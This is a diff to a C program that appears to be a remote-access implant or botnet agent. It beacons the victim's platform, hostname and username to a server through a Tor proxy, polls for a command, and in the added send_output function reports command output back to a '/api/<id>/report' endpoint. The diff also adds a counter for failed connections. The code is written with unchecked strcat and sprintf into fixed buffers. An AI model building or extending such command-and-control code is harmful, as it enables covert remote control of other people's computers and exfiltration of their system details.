@@ -20,7 +20,7 @@ char *HOSTNAME;
 char *USERNAME;
 const char *URL;
 const char *URL_TOR;
-int UPDATE_FAILED;
+int FAILED_COUNT;
 bool IDLE;
 int IDLE_TIME;
 int INTERVAL;
@@ -48,6 +48,17 @@ size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
     memcpy((data->data + index), ptr, n);
     data->data[data->size] = '\0';
     return size * nmemb;
+}
+
+void succeeded_request()
+{
+    FAILED_COUNT = 0;
+}
+
+void failed_request(const char *error)
+{
+    FAILED_COUNT++;
+    fprintf(stdout,"%s\nConsecutive failed connections: %d\n\n",error,FAILED_COUNT);
 }
 
 char* get_unique_id()
@@ -98,15 +109,14 @@ char* get_request(char *path)
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
         res = curl_easy_perform(curl);
-        if(res != CURLE_OK)
-            fprintf(stderr, "curl_easy_perform() failed: %s\n",
-                    curl_easy_strerror(res));
+        if(res != CURLE_OK) failed_request(curl_easy_strerror(res));
+        else succeeded_request();
         curl_easy_cleanup(curl);
     }
     return data.data;
 }
 
-char* post_request(char *path, char *post_data)
+char* post_request(char *path, char *post_data, bool json)
 {
     CURL *curl;
     CURLcode res;
@@ -119,28 +129,41 @@ char* post_request(char *path, char *post_data)
     }
     curl = curl_easy_init();
     if(curl) {
-      char url[BUFFER_SIZE];
-      strcpy(url, URL);
-      strcat(url, path);
-      struct curl_slist *headers = NULL;
-      headers = curl_slist_append(headers, "Accept: application/json");
-      headers = curl_slist_append(headers, "Content-Type: application/json");
-      headers = curl_slist_append(headers, "charset: utf-8");
-      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-      curl_easy_setopt(curl, CURLOPT_URL, url);
-      curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
-      curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-      curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
-      curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
-      res = curl_easy_perform(curl);
-      if(res != CURLE_OK)
-          fprintf(stderr, "curl_easy_perform() failed: %s\n",
-                  curl_easy_strerror(res));
-      curl_easy_cleanup(curl);
+        char url[BUFFER_SIZE];
+        strcpy(url, URL);
+        strcat(url, path);
+        struct curl_slist *headers = NULL;
+        if(json)
+        {
+            headers = curl_slist_append(headers, "Accept: application/json");
+            headers = curl_slist_append(headers, "Content-Type: application/json");
+            headers = curl_slist_append(headers, "charset: utf-8");
+            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+        }
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK) failed_request(curl_easy_strerror(res));
+        else succeeded_request();
+        curl_easy_cleanup(curl);
     }
     return data.data;
 }
 
+char* send_output(char* output, bool newlines)
+{
+    if(output!= NULL && output[0] == '\0') return "";
+    if(newlines) strcat(output,"\n\n");
+    char *path = malloc(BUFFER_SIZE);
+    char *post_data = malloc(BUFFER_SIZE);
+    sprintf(path, "/api/%s/report", get_unique_id());
+    sprintf(post_data,"output=%s",output);
+    return post_request(path, post_data, false);
+
+}
 char* say_hello()
 {
     char *path = malloc(BUFFER_SIZE);
@@ -151,7 +174,7 @@ char* say_hello()
              \"hostname\": \"%s\",\
              \"username\": \"%s\"}",
             PLATFORM,HOSTNAME,USERNAME);
-    return post_request(path, post_data);
+    return post_request(path, post_data, true);
 }
 
 long get_time()
@@ -167,7 +190,7 @@ void setup()
     PLATFORM = malloc(BUFFER_SIZE);
     HOSTNAME = malloc(BUFFER_SIZE);
     USERNAME = malloc(BUFFER_SIZE);
-    UPDATE_FAILED = 0;
+    FAILED_COUNT = 0;
     IDLE = true;
     IDLE_TIME = 60;
     INTERVAL = 3;
@@ -190,13 +213,15 @@ void setup()
 void run()
 {
     char *todo = malloc(BUFFER_SIZE);
+    char *output = malloc(BUFFER_SIZE);
     while(1){
         todo = say_hello(); //TODO: handle error
-        UPDATE_FAILED = 0;
-        if(!(todo!= NULL && todo[0] == '\0') && strcmp(todo, UID) != 0)
+        if(!(todo!= NULL && todo[0] == '\0'))
         {
             IDLE = false;
             TIME_LAST_ACTIVE = get_time();
+            sprintf(output,"$ %s",todo);
+            send_output(output, true);
         }
         else
         {
